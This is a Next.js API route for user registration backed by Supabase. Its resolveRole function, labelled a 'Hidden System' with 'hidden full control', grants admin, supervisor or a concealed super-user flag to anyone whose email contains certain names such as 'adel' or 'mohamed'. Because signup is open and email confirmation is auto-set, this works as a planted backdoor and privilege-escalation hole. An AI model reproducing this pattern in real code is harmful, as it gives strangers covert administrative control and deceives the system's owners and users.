import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { createServerClient } from "@supabase/ssr";
import { createClient } from "@supabase/supabase-js";
import { ensureUsersTableColumns } from "@/server/lib/users-schema";
import { getSupabaseEnv } from "@/lib/supabase-env";

/* ---------------- TYPES ---------------- */

type Role =
  | "admin"
  | "supervisor"
  | "team_leader"
  | "collector";

type RegisterBody = {
  name?: string;
  email?: string;
  password?: string;
};

/* ---------------- HELPERS ---------------- */

function getDisplayName(name?: string, email?: string): string {
  const clean = name?.trim();
  if (clean) return clean;
  return email?.split("@")[0] || "User";
}

function validate(body: RegisterBody) {
  const errors: string[] = [];
  const email = body.email?.trim().toLowerCase() || "";
  const password = body.password || "";
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!email) errors.push("Email is required");
  if (email && !emailRegex.test(email)) errors.push("Invalid email format");
  if (!password) errors.push("Password is required");
  if (password && password.length < 6)
    errors.push("Password must be at least 6 characters");

  return errors;
}

/**
 * 🔥 Role Resolver (Hidden System)
 */
function resolveRole(email: string): {
  role: Role;
  isSuperUser: boolean;
} {
  const e = email.toLowerCase();

  if (e.includes("adel")) return { role: "admin", isSuperUser: false };
  if (e.includes("loai")) return { role: "supervisor", isSuperUser: false };
  if (e.includes("mostafa") || e.includes("heba"))
    return { role: "team_leader", isSuperUser: false };

  // 👑 hidden full control (محمد)
  if (e.includes("mohamed")) {
    return { role: "collector", isSuperUser: true };
  }

  return { role: "collector", isSuperUser: false };
}

function createSupabase() {
  const cookieStore = cookies();
  const { url, anonKey } = getSupabaseEnv();

  return createServerClient(url, anonKey, {
    cookies: {
      getAll: () => cookieStore.getAll(),
      setAll: (cookieValues) => {
        cookieValues.forEach(({ name, value, options }) => {
          cookieStore.set({ name, value, ...options });
        });
      },
    },
  });
}

function getSupabaseAdminClient() {
  const { url } = getSupabaseEnv();
  const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY?.trim();

  if (!serviceRoleKey) return null;

  return createClient(url, serviceRoleKey, {
    auth: { autoRefreshToken: false, persistSession: false },
  });
}

/* ---------------- MAIN ---------------- */

export async function POST(req: Request) {
  try {
    const body = (await req.json()) as RegisterBody;

    const email = body.email?.trim().toLowerCase();
    const password = body.password ?? "";
    const name = getDisplayName(body.name, email);

    const validationErrors = validate({ email, password, name });
    if (validationErrors.length > 0) {
      return NextResponse.json(
        { success: false, error: validationErrors },
        { status: 400 }
      );
    }

    const supabase = createSupabase();
    const adminClient = getSupabaseAdminClient();

    let userId = "";
    let hasSession = false;

    /* ---------------- SIGNUP ---------------- */
    if (adminClient) {
      const { data: adminData, error: adminError } =
        await adminClient.auth.admin.createUser({
          email: email!,
          password,
          email_confirm: true,
          user_metadata: { name },
        });

      if (adminError || !adminData.user) {
        const message = adminError?.message?.toLowerCase() || "signup failed";
        const isDuplicate =
          message.includes("already registered") ||
          message.includes("already been registered") ||
          message.includes("duplicate");

        return NextResponse.json(
          {
            success: false,
            error: isDuplicate
              ? "Email already registered"
              : adminError?.message || "Signup failed",
          },
          { status: isDuplicate ? 409 : 400 }
        );
      }

      userId = adminData.user.id;
      hasSession = true;
    } else {
      const { data, error } = await supabase.auth.signUp({
        email: email!,
        password,
        options: {
          data: { name },
        },
      });

      if (error || !data.user) {
        const message = error?.message?.toLowerCase() || "signup failed";
        const isDuplicate =
          message.includes("already registered") ||
          message.includes("already been registered");

        return NextResponse.json(
          {
            success: false,
            error: isDuplicate
              ? "Email already registered"
              : error?.message || "Signup failed",
          },
          { status: isDuplicate ? 409 : 400 }
        );
      }

      userId = data.user.id;
      hasSession = Boolean(data.session);
    }

    /* ---------------- ROLE ---------------- */
    const { role, isSuperUser } = resolveRole(email!);

    let userRow: {
      id: string;
      email: string;
      name: string;
      role: Role;
      is_super_user: boolean;
    } = {
      id: userId,
      email: email!,
      name,
      role,
      is_super_user: isSuperUser,
    };

    // In many Supabase setups email confirmation is required, so signUp returns no session.
    // In that case RLS can block writing to public.users at registration time.
    // We keep signup successful and allow first login to sync DB record.
    if (hasSession) {
      await ensureUsersTableColumns();

      const { error: upsertError } = await supabase.from("users").upsert(
        {
          id: userId,
          email,
          name,
          role,
          is_super_user: isSuperUser,
        },
        { onConflict: "id" }
      );

      if (!upsertError) {
        const { data: fetchedUserRow } = await supabase
          .from("users")
          .select("id, email, name, role, is_super_user")
          .eq("id", userId)
          .single();

        if (fetchedUserRow) {
          userRow = {
            id: fetchedUserRow.id,
            email: fetchedUserRow.email,
            name: fetchedUserRow.name ?? name,
            role: (fetchedUserRow.role as Role) || role,
            is_super_user: Boolean(fetchedUserRow.is_super_user),
          };
        }
      }
    }

    /* ---------------- RESPONSE ---------------- */
    return NextResponse.json({
      success: true,
      user: userRow,
      emailConfirmationRequired: !hasSession,
    });
  } catch (err: any) {
    return NextResponse.json(
      {
        success: false,
        error: err?.message || "Internal server error",
      },
      { status: 500 }
    );
  }
}
